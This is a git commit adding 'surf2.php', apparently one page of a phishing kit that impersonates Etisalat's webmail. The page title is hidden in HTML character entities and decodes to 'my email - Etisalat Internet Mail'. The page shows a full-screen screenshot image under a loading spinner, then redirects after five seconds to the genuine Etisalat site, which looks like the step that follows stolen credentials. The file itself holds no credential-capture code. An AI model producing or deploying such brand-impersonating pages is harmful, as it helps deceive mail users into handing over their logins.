21239b5e8204ba30f372d9d79039b0b53bace8c2
coleman23 <95127958+coleman23@users.noreply.github.com>
2021-11-27 13:25:54 +0200

    Add files via upload

---
+++ surf2.php
@@ -0,0 +1,50 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+<title>&#109;&#121;&#32;&#101;&#109;&#97;&#105;&#108;&#32;&#45;&#32;&#69;&#116;&#105;&#115;&#97;&#108;&#97;&#116;&#32;&#73;&#110;&#116;&#101;&#114;&#110;&#101;&#116;&#32;&#77;&#97;&#105;&#108;</title>
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="shortcut icon"
+              href="images/favicon.ico"/>
+<html><meta http-equiv="Refresh" content="05; url=https://www.etisalat.ae/en/index.jsp"></html>
+<style type="text/css">
+div#container
+{
+	position:relative;
+	width: 1365px;
+	margin-top: 0px;
+	margin-left: auto;
+	margin-right: auto;
+	text-align:left; 
+}
+body {text-align:center;margin:0}
+</style>
+<style>
+p{font-size: 40px;}
+.loader {
+    position: fixed;
+    left: 0px;
+    top: 0px;
+    width: 100%;
+    height: 100%;
+    z-index: 9999;
+    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
+    opacity: .8;
+}
+</style>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript">
+$(window).load(function() {
+	$(".loader").fadeOut("slow");
+});
+</script>
+</head>
+<body bgcolor="#FAC233">
+<div class="loader"></div>
+<div id="container">
+<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1365px; height:662px; z-index:0"><img src="images/et2.png" alt="" title="" border=0 width=1365 height=662></div>
+
+</div>
+
+</body>
+</html>
